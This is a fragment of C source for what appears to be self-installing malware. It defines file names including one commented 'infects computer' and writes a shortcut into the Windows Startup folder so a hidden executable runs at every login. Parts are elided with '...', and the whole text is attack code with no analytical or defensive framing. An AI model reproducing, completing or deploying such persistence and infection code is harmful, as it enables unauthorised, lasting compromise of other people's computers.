#define FOLDER_NAME "Runtime-win"  //containing folder
#define RUN_FILE_NAME "Runtime-win.exe"  //main run file
#define RUN_LINK_NAME "Runtime-win.lnk"  //starter link
#define INFECT_FILE_NAME "MS-19.exe"  //infects computer
#define INFECT_LINK_NAME "MS-19.lnk"  //link file
...
main(){
    ...
    if(CreateDirectory(folderPath ,NULL)) {  //if directory creation does not fail
        ...
        strcat(tasklnkauto, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Runtime-win.lnk");
